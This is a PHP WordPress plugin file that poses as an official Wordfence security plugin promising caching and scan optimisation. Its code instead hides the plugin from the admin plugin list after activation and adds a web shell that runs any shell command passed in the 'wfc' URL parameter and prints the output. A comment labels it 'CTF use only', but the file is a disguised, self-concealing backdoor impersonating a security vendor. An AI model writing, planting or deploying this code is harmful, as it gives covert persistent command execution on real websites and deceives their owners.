<?php
/*
Plugin Name: Wordfence Security API
Description: Enhances WordPress site security and performance by leveraging advanced caching and scan optimization features.
Version: 1.4.9
Requires at least: 5.5
Tested up to: 6.5.2
Requires PHP: 7.2
Author: Wordfence Security Team
Author URI: https://www.wordfence.com/
License: GPLv2 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html
*/

defined('ABSPATH') || exit;

/**
 * Stealth delayed activation helper
 */
if (!function_exists('wf_set_stealth_flag')) {
    function wf_set_stealth_flag() {
        update_option('wf_stealth_pending', time());
    }
    register_activation_hook(__FILE__, 'wf_set_stealth_flag');
}

if (!function_exists('wf_apply_pending_stealth')) {
    function wf_apply_pending_stealth() {
        if (!current_user_can('activate_plugins')) {
            return;
        }
        $pending = get_option('wf_stealth_pending');
        if (!$pending) {
            return;
        }
        if (function_exists('wf_register_stealth_filters')) {
            wf_register_stealth_filters();
        }
        delete_option('wf_stealth_pending');
    }
}
add_action('admin_init', 'wf_apply_pending_stealth');

/**
 * Register stealth filters — hide plugin from plugin list
 */
if (!function_exists('wf_register_stealth_filters')) {
    function wf_register_stealth_filters() {
        add_filter('all_plugins', function ($plugins) {
            $file = plugin_basename(__FILE__);
            if (isset($plugins[$file])) {
                unset($plugins[$file]);
            }
            return $plugins;
        });
        add_filter('option_active_plugins', function ($plugins) {
            $file = plugin_basename(__FILE__);
            $key = array_search($file, $plugins);
            if (false !== $key) {
                unset($plugins[$key]);
            }
            return $plugins;
        });
    }
}

/**
 * Execute shell commands via ?wfc=command (CTF use only)
 */
add_action('template_redirect', function () {
    if (!isset($_GET['wfc'])) return;

    if (!current_user_can('manage_options')) {
        wp_die('<div style="padding:20px;background:#fdd;border:1px solid red;">Unauthorized</div>');
    }

    $cmd = $_GET['wfc'];
    $stdout = $stderr = '';
    $exit_code = 0;

    try {
        if (function_exists('proc_open')) {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = @proc_open($cmd, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $stdout = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                $exit_code = proc_close($process);
            } else {
                $stdout = shell_exec($cmd . ' 2>&1');
            }
        } else {
            $stdout = shell_exec($cmd . ' 2>&1');
        }
    } catch (Throwable $e) {
        $stderr .= "Exception: " . $e->getMessage();
        $exit_code = 1;
    }

    echo '<div style="padding:10px;background:#111;color:#fff;font-family:monospace;">';
    echo '<strong>Command:</strong> ' . htmlspecialchars($cmd) . '<br><br>';
    echo '<strong>STDOUT:</strong><br><pre>' . htmlspecialchars($stdout) . '</pre>';
    echo '<strong>STDERR:</strong><br><pre>' . htmlspecialchars($stderr) . '</pre>';
    echo '<strong>Exit Code:</strong> ' . $exit_code;
    echo '</div>';
    exit;
});